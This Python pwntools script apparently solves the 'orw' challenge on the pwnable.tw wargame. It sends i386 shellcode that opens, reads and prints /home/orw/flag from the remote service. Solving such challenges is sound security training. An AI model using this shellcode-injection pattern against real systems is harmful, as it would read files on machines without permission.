#!/usr/bin/env python3
import pwn


def main():
    pwn.context(arch='i386', os='linux', endian='little', word_size=32)
    remote = pwn.remote('chall.pwnable.tw', 10001)
    remote.recvuntil("Give my your shellcode:")
    
    shellcode = pwn.asm(
        pwn.shellcraft.open('/home/orw/flag') +
        pwn.shellcraft.read('eax', 'esp', 0x1000) +
        pwn.shellcraft.write(1, 'esp', 'eax')
    )
    assert len(shellcode) <= 0xC8, len(shellcode)
    remote.send(shellcode)
    print("Flag: %s" % remote.recv().rstrip().decode('utf8'))
    remote.close()


if __name__ == "__main__":
    main()
